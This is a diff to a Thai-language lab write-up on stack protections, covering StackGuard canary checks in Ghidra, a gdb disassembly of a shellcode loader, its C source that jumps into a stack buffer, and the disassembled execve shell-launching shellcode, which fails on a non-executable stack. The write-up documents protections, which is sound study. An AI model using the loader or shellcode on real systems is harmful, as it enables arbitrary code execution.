@@ -701,6 +701,17 @@ void function1(const char* str) {
 }
 ```
 
+----
+### Ghidra Stack-L1
+
+![alt text](image-31.png)
+
+- จะเห็นว่า เมื่อ Decompile stack-L1 ที่มี StackGuard
+- compiler จะเพิ่ม code เข้าไปเพื่อตัวสอบค่าของ canary
+
+![alt text](image-32.png)
+
+- ตาม __stack_chk_fail() เข้าไปเจอก็จะเจอ stack smashing detected
 
 ---
 
@@ -731,4 +742,182 @@ void function1(const char* str) {
 ![alt text](image-30.png)
 
 - จาก Task 1 ถ้า shell code สำเร็จ จะแสดง success message
-- เมื่อ stack เป็น **non-executable** 
+- เมื่อ stack เป็น **non-executable** จะเกิด Segmentation fault
+
+
+### Explain
+
+```
+(No debugging symbols found in a32.out)
+gdb-peda$ disassemble main
+Dump of assembler code for function main:
+   0x0000124d <+0>:	endbr32 
+   0x00001251 <+4>:	lea    ecx,[esp+0x4]
+   0x00001255 <+8>:	and    esp,0xfffffff0
+   0x00001258 <+11>:	push   DWORD PTR [ecx-0x4]
+   0x0000125b <+14>:	push   ebp
+   0x0000125c <+15>:	mov    ebp,esp
+   0x0000125e <+17>:	push   ebx
+   0x0000125f <+18>:	push   ecx
+   0x00001260 <+19>:	sub    esp,0x220
+   0x00001266 <+25>:	call   0x1150 <__x86.get_pc_thunk.bx>
+   0x0000126b <+30>:	add    ebx,0x2d5d
+   0x00001271 <+36>:	mov    eax,ecx
+   0x00001273 <+38>:	mov    eax,DWORD PTR [eax+0x4]
+   0x00001276 <+41>:	mov    DWORD PTR [ebp-0x21c],eax
+   0x0000127c <+47>:	mov    eax,gs:0x14
+   0x00001282 <+53>:	mov    DWORD PTR [ebp-0xc],eax
+   0x00001285 <+56>:	xor    eax,eax
+   0x00001287 <+58>:	lea    eax,[ebx-0x1fc0]
+   0x0000128d <+64>:	mov    DWORD PTR [ebp-0x20c],eax
+   0x00001293 <+70>:	sub    esp,0x8
+   0x00001296 <+73>:	lea    eax,[ebx-0x1fb4]
+   0x0000129c <+79>:	push   eax
+   0x0000129d <+80>:	push   DWORD PTR [ebp-0x20c]
+   0x000012a3 <+86>:	call   0x1100 <fopen@plt>
+   0x000012a8 <+91>:	add    esp,0x10
+   0x000012ab <+94>:	mov    DWORD PTR [ebp-0x208],eax
+   0x000012b1 <+100>:	cmp    DWORD PTR [ebp-0x208],0x0
+   0x000012b8 <+107>:	jne    0x12d5 <main+136>
+   0x000012ba <+109>:	sub    esp,0xc
+   0x000012bd <+112>:	push   DWORD PTR [ebp-0x20c]
+   0x000012c3 <+118>:	call   0x10c0 <perror@plt>
+   0x000012c8 <+123>:	add    esp,0x10
+   0x000012cb <+126>:	sub    esp,0xc
+   0x000012ce <+129>:	push   0x1
+   0x000012d0 <+131>:	call   0x10e0 <exit@plt>
+   0x000012d5 <+136>:	push   DWORD PTR [ebp-0x208]
+   0x000012db <+142>:	push   0x1f4
+   0x000012e0 <+147>:	push   0x1
+   0x000012e2 <+149>:	lea    eax,[ebp-0x200]
+   0x000012e8 <+155>:	push   eax
+   0x000012e9 <+156>:	call   0x10d0 <fread@plt>
+   0x000012ee <+161>:	add    esp,0x10
+   0x000012f1 <+164>:	lea    eax,[ebp-0x200]
+   0x000012f7 <+170>:	mov    DWORD PTR [ebp-0x204],eax
+   0x000012fd <+176>:	mov    eax,DWORD PTR [ebp-0x204]
+   0x00001303 <+182>:	call   eax
+   0x00001305 <+184>:	mov    eax,0x1
+   0x0000130a <+189>:	mov    edx,DWORD PTR [ebp-0xc]
+   0x0000130d <+192>:	xor    edx,DWORD PTR gs:0x14
+   0x00001314 <+199>:	je     0x131b <main+206>
+   0x00001316 <+201>:	call   0x13b0 <__stack_chk_fail_local>
+   0x0000131b <+206>:	lea    esp,[ebp-0x8]
+   0x0000131e <+209>:	pop    ecx
+   0x0000131f <+210>:	pop    ebx
+   0x00001320 <+211>:	pop    ebp
+   0x00001321 <+212>:	lea    esp,[ecx-0x4]
+   0x00001324 <+215>:	ret    
+End of assembler dump.
+```
+
+#### call_shellcode.c(เป็น a32.out ใน C language)
+
+```
+#include <stdlib.h>
+#include <stdio.h>
+
+// Read the shellcode from a file, and then execute the code. 
+int main(int argc, char **argv)
+{
+    char code[500];
+    FILE *fd;
+#if __x86_64__
+    const char *filename = "codefile_64";
+#else 
+    const char *filename = "codefile_32";
+#endif
+
+    fd = fopen(filename, "r");
+    if (!fd){
+       perror(filename); exit(1);
+    }
+    fread(code, sizeof(char), 500, fd);
+
+    int (*func)() = (int(*)())code;
+    func();
+    return 1;
+}
+
+
+```
+- จะนำ shellcode ที่อยู่ใน codefile_32 ไปเป็น func();
+- โดยจะนอ่านไฟล์แล้วเก็บไว้ใน code[]
+
+![alt text](image-36.png)
+
+- EAX จะเก็บตำแหน่งของ code[] ที่อยู่ใน stack
+
+![alt text](image-33.png)
+
+- เมื่อตามไปดูใน stack ที่เก็บ shell code ที่ 0xffffcec8
+
+![alt text](image-34.png)
+
+- เมื่อ print stack ออกมาก็จะพบ shell code ที่ใส่ไว้
+
+![alt text](image-35.png)
+
+- แต่ stack ไม่มี x permission
+
+```
+gdb-peda$ x/50i $eax
+   0xffffcec8:	jmp    0xffffcef3
+   0xffffceca:	pop    ebx
+   0xffffcecb:	xor    eax,eax
+   0xffffcecd:	mov    BYTE PTR [ebx+0x9],al
+   0xffffced0:	mov    BYTE PTR [ebx+0xc],al
+   0xffffced3:	mov    BYTE PTR [ebx+0x47],al
+   0xffffced6:	mov    DWORD PTR [ebx+0x48],ebx
+   0xffffced9:	lea    ecx,[ebx+0xa]
+   0xffffcedc:	mov    DWORD PTR [ebx+0x4c],ecx
+   0xffffcedf:	lea    ecx,[ebx+0xd]
+   0xffffcee2:	mov    DWORD PTR [ebx+0x50],ecx
+   0xffffcee5:	mov    DWORD PTR [ebx+0x54],eax
+   0xffffcee8:	lea    ecx,[ebx+0x48]
+   0xffffceeb:	xor    edx,edx
+   0xffffceed:	xor    eax,eax
+   0xffffceef:	mov    al,0xb
+   0xffffcef1:	int    0x80
+   0xffffcef3:	call   0xffffceca
+   0xffffcef8:	das    
+   0xffffcef9:	bound  ebp,QWORD PTR [ecx+0x6e]
+   0xffffcefc:	das    
+   0xffffcefd:	bound  esp,QWORD PTR [ecx+0x73]
+   0xffffcf00:	push   0x2a632d2a
+   0xffffcf05:	das    
+   0xffffcf06:	bound  ebp,QWORD PTR [ecx+0x6e]
+   0xffffcf09:	das    
+   0xffffcf0a:	jb     0xffffcf79
+   0xffffcf0c:	and    BYTE PTR ds:0x742f2066,ch
+   0xffffcf12:	ins    DWORD PTR es:[edi],dx
+   0xffffcf13:	jo     0xffffcf44
+   0xffffcf15:	je     0xffffcf7c
+   0xffffcf17:	jae    0xffffcf8d
+   0xffffcf19:	and    BYTE PTR [esi],ah
+   0xffffcf1b:	and    BYTE PTR es:[ebp+0x63],ah
+   0xffffcf1f:	push   0x7573206f
+   0xffffcf24:	arpl   WORD PTR [ebx+0x65],sp
+   0xffffcf27:	jae    0xffffcf9c
+   0xffffcf29:	and    BYTE PTR [eax],ah
+   0xffffcf2b:	and    BYTE PTR [eax],ah
+   0xffffcf2d:	and    BYTE PTR [eax],ah
+   0xffffcf2f:	and    BYTE PTR [eax],ah
+   0xffffcf31:	and    BYTE PTR [eax],ah
+   0xffffcf33:	and    BYTE PTR [eax],ah
+   0xffffcf35:	and    BYTE PTR [eax],ah
+   0xffffcf37:	and    BYTE PTR [eax],ah
+   0xffffcf39:	and    BYTE PTR [eax],ah
+   0xffffcf3b:	and    BYTE PTR [eax],ah
+   0xffffcf3d:	and    BYTE PTR [eax],ah
+   0xffffcf3f:	sub    al,BYTE PTR [ecx+0x41]
+   0xffffcf42:	inc    ecx
+
+```
+
+
+![alt text](image-37.png)
+
+
+
+
